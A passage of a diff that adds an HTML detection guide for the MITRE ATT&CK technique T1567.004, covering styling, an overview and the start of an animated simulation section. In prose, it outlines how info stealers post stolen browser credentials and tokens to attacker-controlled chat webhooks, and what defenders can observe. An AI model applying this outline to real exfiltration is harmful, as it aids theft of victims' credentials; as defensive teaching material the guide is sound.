@@ -1,0 +1,2493 @@
+<!DOCTYPE html>
+<!-- ATT&amp;CK Detection Guide · T1567.004 · guide version 3.0 (2026-10-22).
+     Self-contained single file: no external CSS/JS/fonts/images.
+     All example URLs, IDs, and token-like values are defanged placeholders —
+     no real channel, bot, workspace, or secret is referenced anywhere. -->
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>T1567.004 · Exfiltration Over Webhook — ATT&CK Detection Guide</title>
+  <meta name="description" content="Beginner-friendly, defensive detection guide for MITRE ATT&CK T1567.004 — Exfiltration Over Webhook. Lab-only red-team view, SOC view, DNS/proxy/EDR detections, Sigma rules, Splunk SPL, case study and cheat sheet.">
+<link rel="canonical" href="https://souhaieb-marzouk.github.io/attack-knowledge-platform/techniques/T1567-Exfiltration-Over-Web-Service/004-Exfiltration-Over-Webhook.html">
+  <meta name="guide-version" content="3.0">
+  <script>
+  (function(){try{var t=localStorage.getItem('atk-theme');if(t!=='light'&&t!=='dark'){t=(window.matchMedia&&window.matchMedia('(prefers-color-scheme: light)').matches)?'light':'dark';}document.documentElement.setAttribute('data-theme',t);}catch(e){document.documentElement.setAttribute('data-theme','dark');}})();
+  </script>
+  <style>
+/* ============ Design tokens ============ */
+:root[data-theme="dark"]{
+  --bg:#0b0f1a; --surface:#121a2e; --surface-2:#172138; --elevated:#1a2542; --text:#e7edf8; --muted:#9aa8c0;
+  --border:#24314e; --border-strong:#2f4066; --accent:#4f8cff; --accent-2:#22d3ee; --violet:#a78bfa;
+  --success:#34d399; --warning:#fbbf24; --danger:#f87171; --high:#fb923c; --low:#4ade80;
+  --shadow:0 10px 30px rgba(2,8,23,.35);
+  --code-bg:#0d1425;
+}
+:root[data-theme="light"]{
+  --bg:#f3f6fc; --surface:#ffffff; --surface-2:#f5f8ff; --elevated:#e9eefa; --text:#182238; --muted:#5a6a85;
+  --border:#d9e2f2; --border-strong:#c2d0ea; --accent:#2f6fe4; --accent-2:#0891b2; --violet:#7c5ce0;
+  --success:#0d9e6e; --warning:#b45309; --danger:#dc2626; --high:#c2410c; --low:#15803d;
+  --shadow:0 10px 30px rgba(23,34,64,.10);
+  --code-bg:#eef3fb;
+}
+/* ============ Base ============ */
+*,*::before,*::after{box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{
+  margin:0; background:var(--bg); color:var(--text);
+  font-family:system-ui,-apple-system,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
+  font-size:16.5px; line-height:1.65;
+}
+code,kbd,pre,.mono{
+  font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,"Liberation Mono",monospace;
+}
+p{max-width:72ch;}
+a{color:var(--accent);}
+a:hover{color:var(--accent-2);}
+strong{color:var(--text);}
+:focus-visible{outline:2px solid var(--accent); outline-offset:2px; border-radius:4px;}
+.skip-link{
+  position:absolute; left:-9999px; top:0; z-index:2000; background:var(--accent); color:#fff;
+  padding:10px 16px; border-radius:0 0 9px 0; font-weight:700;
+}
+.skip-link:focus{left:0;}
+/* ============ Progress bar ============ */
+.progress-bar{
+  position:fixed; top:0; left:0; right:0; height:3px; z-index:1500; background:transparent; pointer-events:none;
+}
+.progress-bar #progressFill{
+  display:block; height:100%; width:0;
+  background:linear-gradient(90deg,var(--accent),var(--accent-2));
+}
+/* ============ Hero ============ */
+.hero{
+  max-width:1280px; margin:0 auto; padding:40px 24px 8px;
+}
+.kicker{
+  font-size:12.5px; letter-spacing:.14em; text-transform:uppercase; color:var(--muted);
+  font-weight:700; margin:0 0 14px;
+}
+h1{
+  font-size:38px; line-height:1.15; font-weight:800; margin:0 0 14px; letter-spacing:-.01em;
+}
+h1 .tid{
+  color:var(--accent); font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,"Liberation Mono",monospace;
+  font-weight:800; margin-right:10px;
+}
+.hero-intro{font-size:18px; color:var(--muted); margin:0 0 20px; max-width:78ch;}
+.chip-row{display:flex; flex-wrap:wrap; gap:8px; margin:0 0 22px;}
+.chip{
+  display:inline-block; padding:5px 12px; border-radius:999px; font-size:13px; font-weight:600;
+  background:var(--surface); border:1px solid var(--border); color:var(--text);
+}
+.chip b{color:var(--accent);}
+.fact-grid{
+  display:grid; grid-template-columns:repeat(4,1fr); gap:14px; margin:0 0 10px;
+}
+.fact-card{
+  background:var(--surface); border:1px solid var(--border); border-radius:14px;
+  box-shadow:var(--shadow); padding:14px 16px;
+}
+.fact-card .fact-label{
+  display:block; font-size:12px; text-transform:uppercase; letter-spacing:.08em;
+  color:var(--accent-2); font-weight:800; margin-bottom:6px;
+}
+.fact-card p{margin:0; font-size:14.5px; color:var(--text); max-width:none;}
+/* ============ Layout / sidebar ============ */
+.layout{
+  max-width:1280px; margin:0 auto; padding:8px 24px 72px;
+  display:grid; grid-template-columns:270px minmax(0,1fr); column-gap:36px;
+  align-items:start;
+}
+#main-content{min-width:0;}
+.toc{
+  position:sticky; top:24px; max-height:calc(100vh - 48px); overflow:auto;
+  background:var(--surface); border:1px solid var(--border); border-radius:14px;
+  box-shadow:var(--shadow); padding:16px 14px; scrollbar-width:thin;
+}
+.theme-btn{
+  width:100%; display:inline-flex; align-items:center; justify-content:center; gap:8px;
+  background:var(--surface-2); color:var(--text); border:1px solid var(--border-strong);
+  border-radius:9px; padding:9px 10px; font-size:14px; font-weight:700; cursor:pointer;
+}
+.theme-btn:hover{border-color:var(--accent);}
+.toc-title{
+  font-size:12px; text-transform:uppercase; letter-spacing:.12em; color:var(--muted);
+  font-weight:800; margin:16px 4px 8px;
+}
+#tocNav ul,.toc-static{list-style:none; margin:0; padding:0;}
+#tocNav li,.toc-static li{margin:2px 0;}
+#tocNav a,.toc-static a{
+  display:block; padding:6px 10px; border-radius:9px; color:var(--text);
+  text-decoration:none; font-size:13.8px; line-height:1.35;
+  border-left:3px solid transparent;
+}
+#tocNav a:hover,.toc-static a:hover{background:var(--surface-2);}
+#tocNav a.active{
+  background:var(--surface-2); border-left-color:var(--accent); color:var(--accent); font-weight:700;
+}
+#tocNav a.toc-sub,.toc-static a.toc-sub{padding-left:24px; font-size:13px; color:var(--muted);}
+#tocNav a.toc-sub.active{color:var(--accent);}
+/* ============ Sections ============ */
+.content-section{margin-top:56px; scroll-margin-top:24px;}
+.section-head{margin-bottom:18px;}
+.section-num{
+  display:inline-flex; align-items:center; justify-content:center;
+  width:34px; height:34px; border-radius:9px; margin-bottom:10px;
+  background:var(--accent); color:#fff; font-weight:800; font-size:16px;
+}
+h2{font-size:28px; line-height:1.2; font-weight:800; margin:0 0 6px; letter-spacing:-.01em;}
+h3{font-size:20px; line-height:1.25; font-weight:800; margin:30px 0 10px; scroll-margin-top:24px;}
+h4{font-size:17px; line-height:1.3; font-weight:800; margin:20px 0 8px; color:var(--text);}
+.section-intro{color:var(--muted); margin:0; max-width:80ch;}
+.content-section > p, .content-section li{max-width:76ch;}
+.content-section ul,.content-section ol{padding-left:24px; margin:10px 0;}
+.content-section li{margin:5px 0;}
+/* ============ Cards & grids ============ */
+.card{
+  background:var(--surface); border:1px solid var(--border); border-radius:14px;
+  box-shadow:var(--shadow); padding:18px 20px; margin:14px 0;
+}
+.grid{display:grid; gap:14px; margin:14px 0;}
+.grid.cols-2{grid-template-columns:repeat(2,1fr);}
+.grid.cols-3{grid-template-columns:repeat(3,1fr);}
+.grid .card{margin:0;}
+.card h4{margin-top:0;}
+/* ============ Callouts ============ */
+.callout{
+  border:1px solid var(--border); border-left:4px solid var(--accent); border-radius:12px;
+  background:var(--surface-2); padding:14px 16px; margin:16px 0;
+}
+.callout p{margin:0 0 8px;}
+.callout p:last-child{margin-bottom:0;}
+.callout .callout-label{display:inline; font-weight:800;}
+.callout.note{border-left-color:var(--accent);}
+.callout.note .callout-label{color:var(--accent);}
+.callout.warning{border-left-color:var(--warning);}
+.callout.warning .callout-label{color:var(--warning);}
+.callout.practice{border-left-color:var(--success);}
+.callout.practice .callout-label{color:var(--success);}
+.callout.danger{border-left-color:var(--danger);}
+.callout.danger .callout-label{color:var(--danger);}
+/* ============ Badges ============ */
+.badge{
+  display:inline-block; padding:3px 10px; border-radius:999px; font-size:12px; font-weight:800;
+  border:1px solid transparent; white-space:nowrap;
+}
+.badge.sev-critical{background:rgba(248,113,113,.16); color:var(--danger); border-color:var(--danger);}
+.badge.sev-high{background:rgba(251,146,60,.16); color:var(--high); border-color:var(--high);}
+.badge.sev-medium{background:rgba(251,191,36,.14); color:var(--warning); border-color:var(--warning);}
+.badge.sev-low{background:rgba(74,222,128,.14); color:var(--low); border-color:var(--low);}
+.badge.cat-windows,.badge.cat-macos,.badge.cat-linux{background:var(--surface-2); color:var(--text); border-color:var(--border-strong);}
+.badge.cat-cloud{background:rgba(34,211,238,.12); color:var(--accent-2); border-color:var(--accent-2);}
+.badge.cat-network{background:rgba(79,140,255,.14); color:var(--accent); border-color:var(--accent);}
+.badge.cat-identity{background:rgba(167,139,250,.14); color:var(--violet); border-color:var(--violet);}
+.badge.conf-high{background:rgba(52,211,153,.14); color:var(--success); border-color:var(--success);}
+.badge.conf-medium{background:rgba(251,191,36,.14); color:var(--warning); border-color:var(--warning);}
+.badge.conf-low{background:rgba(154,168,192,.14); color:var(--muted); border-color:var(--muted);}
+/* ============ Key/value ============ */
+.kv{list-style:none; padding:0; margin:10px 0;}
+.kv li{
+  display:grid; grid-template-columns:180px 1fr; gap:12px; padding:7px 0;
+  border-bottom:1px dashed var(--border); max-width:none;
+}
+.kv li:last-child{border-bottom:none;}
+.kv .k{color:var(--muted); font-weight:700; font-size:14px;}
+.kv .v{color:var(--text);}
+/* ============ Tables ============ */
+.table-wrap{overflow-x:auto; margin:16px 0; border:1px solid var(--border); border-radius:14px; box-shadow:var(--shadow); background:var(--surface);}
+table{border-collapse:collapse; width:100%; min-width:640px; font-size:14.5px;}
+th,td{padding:10px 12px; text-align:left; vertical-align:top; border-bottom:1px solid var(--border);}
+thead th{
+  background:var(--surface-2); color:var(--text); font-size:13px; text-transform:uppercase;
+  letter-spacing:.06em; position:sticky; top:0;
+}
+tbody tr:last-child td{border-bottom:none;}
+tbody tr:hover{background:var(--surface-2);}
+td .mono,code{font-size:.92em;}
+code{
+  background:var(--code-bg); border:1px solid var(--border); border-radius:6px; padding:1px 5px;
+}
+code,.mono{overflow-wrap:anywhere;}
+.content-section p,.content-section li,.section-intro{overflow-wrap:break-word;}
+/* ============ Code blocks ============ */
+.code-block{margin:16px 0; border:1px solid var(--border); border-radius:12px; overflow:hidden; background:var(--code-bg);}
+.code-head{
+  display:flex; align-items:center; justify-content:space-between; gap:12px;
+  padding:8px 12px; background:var(--surface-2); border-bottom:1px solid var(--border);
+}
+.code-head .code-title{
+  font-size:12.5px; font-weight:800; color:var(--muted); letter-spacing:.05em; text-transform:uppercase;
+  font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,"Liberation Mono",monospace;
+}
+.copy-btn{
+  background:var(--surface); color:var(--text); border:1px solid var(--border-strong);
+  border-radius:9px; font-size:12.5px; font-weight:700; padding:4px 12px; cursor:pointer;
+}
+.copy-btn:hover{border-color:var(--accent); color:var(--accent);}
+.copy-btn.copied{color:var(--success); border-color:var(--success);}
+.code-block pre{margin:0; padding:14px 16px; overflow:auto;}
+.code-block pre code{background:none; border:none; padding:0; font-size:13.5px; line-height:1.55; display:block; min-width:max-content;}
+/* ============ Timeline ============ */
+.timeline{list-style:none; margin:18px 0; padding:0 0 0 26px; border-left:2px solid var(--border-strong);}
+.timeline .tl-item{position:relative; margin:0 0 22px; padding-left:16px;}
+.timeline .tl-item::before{
+  content:""; position:absolute; left:-33px; top:6px; width:12px; height:12px; border-radius:50%;
+  background:var(--accent); border:2px solid var(--bg); box-shadow:0 0 0 2px var(--accent);
+}
+.timeline .tl-date{
+  font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,"Liberation Mono",monospace;
+  font-size:13px; font-weight:800; color:var(--accent-2); display:block; margin-bottom:4px;
+}
+.timeline .tl-body h4{margin:0 0 6px;}
+.timeline .tl-body p{margin:0 0 6px;}
+/* ============ Simulation ============ */
+.sim-wrap{
+  background:var(--surface); border:1px solid var(--border); border-radius:14px;
+  box-shadow:var(--shadow); padding:16px; margin:16px 0;
+}
+.sim-stage{position:relative;}
+#simCanvas{
+  width:100%; height:auto; display:block; border:1px solid var(--border); border-radius:12px;
+  background:var(--surface-2); touch-action:manipulation;
+}
+.sim-caption{
+  margin:12px 0 4px; font-size:15.5px; font-weight:700;
+}
+.sim-caption .sim-step-no{color:var(--accent); font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,"Liberation Mono",monospace;}
+.sim-defender{
+  background:var(--surface-2); border:1px solid var(--border-strong); border-left:4px solid var(--accent-2);
+  border-radius:10px; padding:10px 12px; margin:8px 0; font-size:14.5px;
+}
+.sim-defender .sim-defender-label{
+  display:block; font-size:11.5px; text-transform:uppercase; letter-spacing:.1em; color:var(--accent-2); font-weight:800; margin-bottom:2px;
+}
+.sim-evidence{display:flex; flex-wrap:wrap; gap:6px; margin:10px 0;}
+.sim-evidence .ev{
+  font-size:12px; font-weight:700; padding:3px 10px; border-radius:999px;
+  background:rgba(167,139,250,.12); border:1px solid var(--violet); color:var(--violet);
+  transition:opacity .25s;
+}
+.sim-evidence .ev.dim{opacity:.35; border-style:dashed;}
+.sim-evidence .ev.ev-blind{background:rgba(248,113,113,.10); border-color:var(--danger); color:var(--danger);}
+.sim-evidence .ev.ev-none{background:var(--surface-2); border-color:var(--border-strong); color:var(--muted);}
+.sim-controls{
+  display:flex; flex-wrap:wrap; gap:8px; align-items:center; margin-top:12px;
+}
+.sim-controls button,.sim-controls select{
+  background:var(--surface-2); color:var(--text); border:1px solid var(--border-strong);
+  border-radius:9px; padding:8px 14px; font-size:14px; font-weight:700; cursor:pointer;
+}
+.sim-controls button:hover{border-color:var(--accent); color:var(--accent);}
+.sim-controls button[aria-pressed="true"]{background:var(--accent); border-color:var(--accent); color:#fff;}
+.sim-controls label{font-size:13px; color:var(--muted); font-weight:700;}
+.sim-chips{display:flex; flex-wrap:wrap; gap:6px; margin-top:10px;}
+.sim-chips button{
+  background:var(--surface-2); color:var(--muted); border:1px solid var(--border);
+  border-radius:9px; padding:5px 10px; font-size:12.5px; font-weight:700; cursor:pointer;
+}
+.sim-chips button:hover{border-color:var(--accent); color:var(--accent);}
+.sim-chips button[aria-current="true"]{
+  background:var(--accent); border-color:var(--accent); color:#fff;
+}
+.sim-tooltip{
+  position:fixed; z-index:1600; max-width:280px; background:var(--elevated); color:var(--text);
+  border:1px solid var(--border-strong); border-radius:10px; box-shadow:var(--shadow);
+  padding:8px 12px; font-size:13px; pointer-events:none; display:none;
+}
+.sim-tooltip .tt-title{font-weight:800; display:block; margin-bottom:2px; color:var(--accent-2);}
+.sim-hint{font-size:13px; color:var(--muted); margin:8px 0 0;}
+/* ============ Float buttons & overlay ============ */
+.float-btn{
+  position:fixed; right:18px; z-index:1400; background:var(--elevated); color:var(--text);
+  border:1px solid var(--border-strong); border-radius:999px; box-shadow:var(--shadow);
+  font-weight:700; cursor:pointer;
+}
+#tocOpen{bottom:18px; padding:10px 18px; font-size:14px; display:none;}
+#backToTop{bottom:64px; width:42px; height:42px; font-size:18px; opacity:0; pointer-events:none; transition:opacity .25s;}
+#backToTop.show{opacity:1; pointer-events:auto;}
+.overlay{
+  position:fixed; inset:0; z-index:1700; background:rgba(4,8,18,.72);
+  display:flex; align-items:flex-start; justify-content:center; padding:8vh 16px 16px;
+}
+.overlay[hidden]{display:none;}
+.overlay .overlay-panel{
+  background:var(--surface); border:1px solid var(--border-strong); border-radius:14px;
+  box-shadow:var(--shadow); width:min(480px,100%); max-height:80vh; overflow:auto; padding:16px;
+}
+.overlay .overlay-head{display:flex; align-items:center; justify-content:space-between; margin-bottom:10px;}
+.overlay .overlay-title{font-size:18px; font-weight:800; margin:0; letter-spacing:-.01em;}
+.overlay .overlay-close{
+  background:var(--surface-2); border:1px solid var(--border-strong); color:var(--text);
+  border-radius:9px; padding:6px 12px; font-weight:700; cursor:pointer;
+}
+.overlay nav a{
+  display:block; padding:8px 10px; border-radius:9px; text-decoration:none; color:var(--text); font-size:15px;
+}
+.overlay nav a:hover{background:var(--surface-2);}
+.overlay nav a.toc-sub{padding-left:26px; color:var(--muted); font-size:14px;}
+.overlay .theme-btn{margin-top:12px;}
+/* ============ Misc ============ */
+.lede{font-size:17.5px;}
+.mini-note{font-size:13px; color:var(--muted);}
+.pill-list{display:flex; flex-wrap:wrap; gap:8px; list-style:none; padding:0; margin:10px 0;}
+.pill-list li{
+  background:var(--surface-2); border:1px solid var(--border); border-radius:999px;
+  padding:4px 12px; font-size:13px; font-weight:600;
+}
+hr.sep{border:none; border-top:1px solid var(--border); margin:28px 0;}
+/* ============ Responsive ============ */
+@media (max-width:1040px){
+  .layout{grid-template-columns:minmax(0,1fr);}
+  .toc{display:none;}
+  #tocOpen{display:block;}
+  h1{font-size:32px;}
+}
+@media (max-width:640px){
+  .fact-grid{grid-template-columns:1fr;}
+  .grid.cols-2,.grid.cols-3{grid-template-columns:1fr;}
+  h1{font-size:27px;}
+  .hero{padding-top:28px;}
+  .kv li{grid-template-columns:1fr; gap:2px;}
+  .sim-controls button,.sim-controls select{flex:1 1 auto;}
+}
+/* ============ Reduced motion ============ */
+@media (prefers-reduced-motion: reduce){
+  html{scroll-behavior:auto;}
+  *,*::before,*::after{animation:none !important; transition:none !important;}
+}
+/* ============ Print ============ */
+@media print{
+  :root{--bg:#ffffff; --surface:#ffffff; --surface-2:#f4f6fa; --elevated:#f4f6fa; --text:#111827; --muted:#4b5563;
+    --border:#d1d5db; --border-strong:#9ca3af; --accent:#1d4ed8; --accent-2:#0e7490; --violet:#6d28d9;
+    --success:#047857; --warning:#b45309; --danger:#b91c1c; --high:#c2410c; --low:#15803d; --code-bg:#f4f6fa; --shadow:none;}
+  .toc,#tocOpen,#backToTop,.overlay,.progress-bar,.skip-link,.sim-controls,.sim-chips,.copy-btn,.theme-btn{display:none !important;}
+  body{background:#fff; color:#111827; font-size:12pt;}
+  .layout{display:block; padding:0; max-width:none;}
+  .content-section{break-inside:auto; margin-top:28px;}
+  .card,.callout,.code-block,.table-wrap,.fact-card,.sim-wrap{box-shadow:none; break-inside:avoid;}
+  .code-block pre{white-space:pre-wrap;}
+  .code-block pre code{min-width:0;}
+  a{color:#1d4ed8; text-decoration:underline;}
+  h2,h3,h4{break-after:avoid;}
+}
+  </style>
+</head>
+<body>
+  <!-- ==== PLATFORM INTEGRATION (paste right after <body>) ==== -->
+  <link rel="stylesheet" href="../../assets/css/platform.css">
+  <div id="atk-header" data-technique="T1567.004"></div>
+  <script src="../../assets/js/platform.js" defer></script>
+  <!-- ==== /PLATFORM INTEGRATION ==== -->
+
+  <a class="skip-link" href="#main-content">Skip to main content</a>
+  <div class="progress-bar" aria-hidden="true"><span id="progressFill"></span></div>
+
+  <section class="hero">
+    <p class="kicker">MITRE ATT&amp;CK · EXFILTRATION · TA0010 · SUB-TECHNIQUE</p>
+    <h1><span class="tid">T1567.004</span> Exfiltration Over Webhook</h1>
+    <p class="hero-intro">Stolen data is posted straight into an attacker's chat channel using a <strong>webhook</strong> — a one-way "post here" URL (a web address that accepts uploads) from services like Discord, Slack, or Telegram. The data lands where criminals are already looking: their own chat apps, on their phones. This guide shows how the trick works in a safe lab, what traces it leaves, and how to build detections that catch it.</p>
+    <div class="chip-row">
+      <span class="chip"><b>Tactic:</b> Exfiltration</span>
+      <span class="chip"><b>ID:</b> T1567.004</span>
+      <span class="chip"><b>Parent:</b> T1567</span>
+      <span class="chip"><b>Platforms:</b> ESXi · Linux · Office Suite · SaaS · Windows · macOS</span>
+      <span class="chip"><b>Type:</b> Sub-technique</span>
+      <span class="chip"><b>ATT&amp;CK data:</b> Version 1.2 · created 20 July 2023 · last modified 12 May 2026</span>
+    </div>
+    <div class="fact-grid">
+      <div class="fact-card">
+        <span class="fact-label">What happens</span>
+        <p>An HTTP POST (the web's standard upload request) carries files or text to a chat webhook URL over the normal, encrypted web traffic every company already allows.</p>
+      </div>
+      <div class="fact-card">
+        <span class="fact-label">Chain position</span>
+        <p>The final stage of an attack — and the favorite drop point of commodity info stealers that harvest browser data.</p>
+      </div>
+      <div class="fact-card">
+        <span class="fact-label">Biggest risk</span>
+        <p>Chat domains are widely trusted, and one webhook URL is a permanent, free drop box that needs no attacker server.</p>
+      </div>
+      <div class="fact-card">
+        <span class="fact-label">Detect with</span>
+        <p>DNS/SNI records (domain lookups and the service name inside encrypted connections) to chat APIs, webhook-URL patterns in command lines and script blocks, and first-seen egress from a host.</p>
+      </div>
+    </div>
+  </section>
+
+  <div class="layout">
+    <aside class="toc" aria-label="Table of contents">
+      <button id="themeToggle" class="theme-btn" type="button" aria-label="Switch color theme">🌙 <span>Dark mode</span></button>
+      <p class="toc-title">On this page</p>
+      <nav id="tocNav" aria-label="Section links"><!-- JS builds links from the REAL headings --></nav>
+      <noscript>
+        <ul class="toc-static">
+          <li><a href="#sec-1-overview">1 · Overview</a></li>
+          <li><a href="#sec-2-simulation">2 · Animated Simulation</a></li>
+          <li><a href="#sec-3-red-team">3 · Red Team Perspective</a></li>
+          <li><a href="#sec-4-blue-team">4 · Blue Team Perspective</a></li>
+          <li><a href="#sec-5-detection">5 · Detection Engineering Deep Dive</a></li>
+          <li><a class="toc-sub" href="#sec-5-1-regulation">5.1 · Regulation Mapping</a></li>
+          <li><a class="toc-sub" href="#sec-5-2-intel">5.2 · Threat Intelligence</a></li>
+          <li><a class="toc-sub" href="#sec-5-3-threats">5.3 · Threats Ranking</a></li>
+          <li><a class="toc-sub" href="#sec-5-4-logs">5.4 · Logs and Patterns</a></li>
+          <li><a class="toc-sub" href="#sec-5-5-rules">5.5 · Sigma Rules and Splunk SPL</a></li>
+          <li><a href="#sec-6-case-study">6 · Real-World Case Study</a></li>
+          <li><a href="#sec-7-mitigation">7 · Mitigation and Defense</a></li>
+          <li><a href="#sec-8-mistakes">8 · Common Mistakes</a></li>
+          <li><a href="#sec-9-cheat-sheet">9 · Cheat Sheet</a></li>
+        </ul>
+      </noscript>
+    </aside>
+
+    <main id="main-content">
+      <section id="sec-1-overview" class="content-section">
+        <div class="section-head">
+          <span class="section-num">1</span>
+          <h2>Overview</h2>
+          <p class="section-intro">What "exfiltration over webhook" means, why attackers love it, and what you will learn on this page.</p>
+        </div>
+
+        <p class="lede">A <strong>webhook</strong> is a special URL that a chat service gives you so programs can post messages into your channel. You send an HTTP POST request — the web's standard upload request — to the URL, and the service turns that request into a message in the channel. Discord, Slack, Microsoft Teams, and Telegram all offer webhooks or similar "bot post" features for programs, through their APIs (application programming interfaces). The URL is designed to accept data from the outside — that is its whole job.</p>
+
+        <p>MITRE ATT&amp;CK tracks this behavior as <strong>T1567.004 — Exfiltration Over Webhook</strong>, a sub-technique of <a href="https://attack.mitre.org/techniques/T1567/">T1567 Exfiltration Over Web Service</a>. Instead of renting a server, the attacker creates a free webhook in a chat workspace they control. Malware on a victim machine then POSTs stolen files or text straight to that URL. The stolen data shows up as a chat message with attachments, ready to read on the attacker's phone. Two real cases are listed on the ATT&amp;CK page for this technique. The <strong>Shai-Hulud</strong> worm (S9008) posted stolen repository secrets to a webhook receiver. The <strong>2025 Poland Wiper Attacks</strong> (C0063) used an attacker-controlled Slack channel to move data out. ATT&amp;CK records the technique as created on 20 July 2023 and last modified on 12 May 2026.</p>
+
+        <p><strong>Why it matters:</strong> most companies allow traffic to chat and SaaS (software-as-a-service) domains, because people need them for work. Webhook traffic uses normal HTTPS (encrypted web traffic), it goes to a trusted domain, and it needs no malware infrastructure at all. A single pasted URL is all the "server" an attacker needs — and it keeps working until someone reports or deletes it. That makes this technique cheap, quiet, and very popular with info stealers.</p>
+
+        <h4>Where it sits in the attack chain</h4>
+        <p>Exfiltration is the <strong>last step</strong> of the ATT&amp;CK chain. Before it, the attacker (or malware) has already run code on the machine (Execution). It has collected interesting data (Collection — often browser passwords, cookies, tokens, and files). And it has prepared the data for transfer (Archive Collected Data, often a small ZIP archive). T1567.004 is simply the moment the data actually leaves: the packaged data is pushed out through the webhook. Because it is so late in the chain, catching it here is your last chance to stop the data. The traces it leaves (DNS, SNI, process lines, file events) are also excellent early-warning signals for the whole infection.</p>
+
+        <div class="grid cols-2">
+          <div class="card">
+            <h4>What an attacker does</h4>
+            <ol>
+              <li>Create a chat workspace and a webhook (free, takes one minute).</li>
+              <li>Embed that webhook URL in a stealer, loader, script, or build job.</li>
+              <li>The malware collects data, packs it, and POSTs it to the URL.</li>
+              <li>Read the loot in the chat channel — files and text arrive as messages.</li>
+            </ol>
+          </div>
+          <div class="card">
+            <h4>What a defender sees</h4>
+            <ol>
+              <li>DNS or SNI connections to chat APIs from odd processes.</li>
+              <li>Command lines or script blocks containing the webhook URL.</li>
+              <li>A small archive created in %TEMP% right before the POST.</li>
+              <li>Sometimes: nothing at all until the stolen data is abused later.</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="card">
+          <h4>Key facts</h4>
+          <ul class="kv">
+            <li><span class="k">ATT&amp;CK ID</span><span class="v mono">T1567.004 · Exfiltration Over Webhook · parent T1567 · tactic TA0010 (Exfiltration).</span></li>
+            <li><span class="k">ATT&amp;CK data</span><span class="v">Version 1.2 · created 20 July 2023 · last modified 12 May 2026.</span></li>
+            <li><span class="k">Platforms</span><span class="v">ESXi, Linux, Office Suite, SaaS, Windows, macOS — the official ATT&amp;CK list, in that order. ESXi means VMware virtualization hosts, which matter here because build runners are often virtual machines (VMs). Office Suite and SaaS appear because malicious add-ins, connectors, and workload scripts inside tenant apps can post data to webhooks too. This guide focuses on the desktop platforms, where the pattern is most common.</span></li>
+            <li><span class="k">Permissions</span><span class="v">Usually none beyond the user the malware runs as — no admin needed to reach the internet.</span></li>
+            <li><span class="k">Common services abused</span><span class="v">Discord webhooks, Slack incoming webhooks, Telegram bot API, Microsoft Teams connectors, generic receivers such as webhook.site.</span></li>
+            <li><span class="k">Data sources</span><span class="v">Network traffic (DNS, SNI, proxy), process and command-line monitoring, file events, PowerShell script-block logs, SaaS/CASB (cloud access security broker) audit logs.</span></li>
+            <li><span class="k">Typical payload</span><span class="v">One multipart POST carrying a small ZIP (browser data, credentials, tokens) plus a text caption.</span></li>
+          </ul>
+        </div>
+
+        <h4>What you will learn</h4>
+        <ul>
+          <li>How the technique works end to end, shown as an 8-step animated simulation of an info stealer posting stolen data to a Discord webhook.</li>
+          <li>How attackers set it up (lab-only examples) and which mistakes they make.</li>
+          <li>Which logs to collect, which patterns matter, and how to write detections: seven complete Sigma rules (the open detection-rule format) plus matching Splunk SPL (Splunk's search language).</li>
+          <li>How to respond, which regulations expect this kind of monitoring, and the most common blue-team mistakes to avoid.</li>
+        </ul>
+
+        <div class="callout note">
+          <p><span class="callout-label">🛈 Note — scope.</span> Everything here is written for defenders and students. The red-team section only shows how to send test data to a webhook that <em>you</em> created in <em>your own</em> test workspace. There is no working malware, no real stolen data, and no instructions for attacking other people's systems in this guide.</p>
+        </div>
+      </section>
+      <section id="sec-2-simulation" class="content-section">
+        <div class="section-head">
+          <span class="section-num">2</span>
+          <h2>Animated Simulation</h2>
+          <p class="section-intro">Watch an info stealer steal browser data and post it to a Discord webhook — and see, at the same time, what the SOC can and cannot observe at each step.</p>
+        </div>
+
+        <p>This canvas shows four players. An <strong>attacker</strong> owns a Discord channel. A <strong>user PC</strong> gets infected. The <strong>Discord API</strong> hosts the webhook. The <strong>SOC</strong> (security operations center) is the defenders' view, standing in for their EDR (endpoint detection and response), DNS, and proxy telemetry. Press Play to run the 8-step story. Step chips jump to any step, and hovering or clicking a node explains what it is. Below the canvas you will find the same story written out in full — that text is the accessible alternative to the animation.</p>
+
+        <div class="sim-wrap">
+          <div class="sim-stage">
+            <canvas id="simCanvas" width="960" height="560" role="img" aria-label="Animated diagram: an info stealer on a user PC collects browser credentials, packs them into a ZIP file, and POSTs them to a Discord webhook while the SOC watches DNS, EDR, and proxy telemetry. Eight steps from fake installer download to SOC verdict."></canvas>
+          </div>
+          <p class="sim-caption" aria-live="polite"><span class="sim-step-no" id="simStepNo">Step 1/8</span> · <span id="simTitle">A fake installer</span></p>
+          <div class="sim-defender">
+            <span class="sim-defender-label">What the defender sees</span>
+            <span id="simDefender">File reputation flag on the downloaded installer (retrospective) — queued for review, not yet blocking anything.</span>
+          </div>
+          <div class="sim-evidence" id="simEvidence" aria-live="polite"><span class="ev dim" data-step="2">EDR binary event</span><span class="ev dim" data-step="3">browser-store file reads</span><span class="ev dim" data-step="4">ZIP create</span><span class="ev dim" data-step="5">DNS first-seen</span><span class="ev dim" data-step="5">SNI/proxy row</span><span class="ev dim" data-step="7">impossible-travel alert</span><span class="ev dim" data-step="8">egress policy</span></div>
+          <div class="sim-controls">
+            <button id="simPlay" type="button" aria-label="Play simulation">▶ Play</button>
+            <button id="simPause" type="button" aria-label="Pause simulation">⏸ Pause</button>
+            <button id="simRestart" type="button" aria-label="Restart simulation">↺ Restart</button>
+            <button id="simPrev" type="button" aria-label="Previous step">◀ Prev</button>
+            <button id="simNext" type="button" aria-label="Next step">Next ▶</button>
+            <label for="simSpeed">Speed</label>
+            <select id="simSpeed" aria-label="Simulation speed">
+              <option value="0.5">0.5×</option>
+              <option value="1" selected>1×</option>
+              <option value="2">2×</option>
+            </select>
+          </div>
+          <div class="sim-chips" id="simChips" role="group" aria-label="Simulation steps"></div>
+          <p class="sim-hint">Tip: hover or tap any node on the canvas for a description. With "reduce motion" enabled in your OS, the simulation never autoplays — Play advances one step at a time without moving packets.</p>
+        </div>
+
+        <h4>The story, step by step</h4>
+        <ol>
